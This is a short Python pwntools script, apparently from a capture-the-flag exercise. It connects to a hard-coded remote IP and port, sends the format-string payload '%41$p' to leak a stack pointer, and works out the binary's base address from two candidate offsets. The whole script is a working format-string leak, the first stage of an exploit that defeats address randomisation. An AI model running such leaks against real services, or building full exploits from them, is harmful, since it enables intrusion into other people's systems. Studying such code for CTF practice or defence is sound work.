from pwn import *

# context.log_level = 'error'

def check():
    try:
        r = remote("34.93.66.31", 34429)
        r.sendlineafter(b"> ", b"%41$p")
        leak_str = r.recvline().strip().decode()
        leak_val = int(leak_str, 16)
        print(f"Leak: {hex(leak_val)}")
        
        # Check against local offset 0x134d
        base_local = leak_val - 0x134d
        print(f"If local (0x134d): Base = {hex(base_local)}")
        if base_local & 0xfff == 0:
            print("  -> Aligned! Likely local binary.")
        else:
            print("  -> Not aligned.")
            
        # Check against remote offset 0x13d7
        base_remote = leak_val - 0x13d7
        print(f"If remote (0x13d7): Base = {hex(base_remote)}")
        if base_remote & 0xfff == 0:
            print("  -> Aligned! Likely remote binary.")
        else:
            print("  -> Not aligned.")
            
        r.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    check()
